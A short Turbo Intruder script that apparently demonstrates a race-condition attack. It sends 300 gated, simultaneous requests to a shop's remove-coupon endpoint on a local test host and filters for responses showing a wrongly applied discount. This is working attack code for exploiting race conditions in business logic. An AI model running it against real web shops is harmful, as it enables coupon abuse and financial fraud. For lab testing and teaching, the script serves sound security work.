# Simple example with hardcoded request's target and payload

def queueRequests(target, wordlists):
    requests_target = '''GET /basket/remove-coupon?%s HTTP/1.1
Host: 127.0.0.1:8093

'''


    engine = RequestEngine(endpoint='http://127.0.0.1:8093',
                           concurrentConnections=500,
                           requestsPerConnection=200,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(300):
        engine.queue(requests_target, "some payload here. it will be passed to the %s in the target string", gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

# We want to filter out the safe response and keep only the wrong ones
@FilterRegex(r".*40\.0.*")
def handleResponse(req, interesting):
    table.add(req)
